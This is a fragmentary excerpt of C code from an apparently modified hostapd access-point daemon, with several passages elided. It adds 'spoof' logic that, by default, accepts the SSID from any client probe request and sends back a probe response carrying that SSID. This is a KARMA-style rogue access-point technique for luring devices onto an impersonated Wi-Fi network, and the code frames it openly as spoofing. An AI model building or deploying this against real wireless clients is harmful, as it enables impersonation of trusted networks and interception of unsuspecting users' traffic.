...
#define MAX_PROBERESP_LEN 768
	...
	*pos++ = WLAN_EID_SSID;
	...
	// Use normal behaviour if no spoof given
	if(spoof == NULL) {
		*pos++ = hapd->conf->ssid.ssid_len;
		os_memcpy(pos, hapd->conf->ssid.ssid, hapd->conf->ssid.ssid_len);
		pos += hapd->conf->ssid.ssid_len;
	} else {
		*pos++ = spoof->ssid_len; // Add ssid_len size to pos (u8)
		os_memcpy(pos, spoof->ssid, spoof->ssid_len); // Copy ssid there
		pos += spoof->ssid_len; // Add ssid size to pos
	}
		      ...
		      int ssi_signal)
{
	...
	if (hapd->conf->ignore_broadcast_ssid && !hapd->conf->answer_broadcast_probereq && elems.ssid_len == 0 &&
...
#endif /* CONFIG_P2P */
	// Create fake SSID struct
	struct spoof_ssid spoofedssid;

	// Match SSID
	res = ssid_match(hapd, elems.ssid, elems.ssid_len, elems.ssid_list, elems.ssid_list_len);

	if(hapd->conf->specific) {
		// Only send if matched
		if (res != NO_SSID_MATCH) {
			if (sta)
				sta->ssid_probe = &hapd->conf->ssid;

			char ssid_txt[HOSTAPD_MAX_SSID_LEN];
			ieee802_11_print_ssid(ssid_txt, elems.ssid, elems.ssid_len);

			wpa_printf(MSG_INFO, "Spoofed Probe Response for STA " MACSTR " and specific AP %s", MAC2STR(mgmt->sa), ssid_txt);
		}
	} else {
		// Always accept SSID from Probe Request
		res = EXACT_SSID_MATCH;

		// Set spoofed probe response SSID
		set_spoofed_ssid(hapd, &spoofedssid, &elems);

		if (sta)
			sta->ssid_probe = &hapd->conf->ssid;

		char ssid_txt[HOSTAPD_MAX_SSID_LEN];
		ieee802_11_print_ssid(ssid_txt, spoofedssid.ssid, spoofedssid.ssid_len);

		//wpa_printf(MSG_INFO, "Spoofed Probe Response for STA " MACSTR " and AP %s", MAC2STR(mgmt->sa), ssid_txt);
	}
	...
	// Spoof
	if(hapd->conf->specific) {
		resp = hostapd_gen_probe_resp(hapd, sta, mgmt, elems.p2p != NULL, &resp_len, NULL);
	} else {
		resp = hostapd_gen_probe_resp(hapd, sta, mgmt, elems.p2p != NULL, &resp_len, &spoofedssid);
	}
	if (resp == NULL)
		return;
					...
					size_t *resp_len)
{
	...
	return hostapd_gen_probe_resp(hapd, NULL, NULL, 0, resp_len, NULL);
}
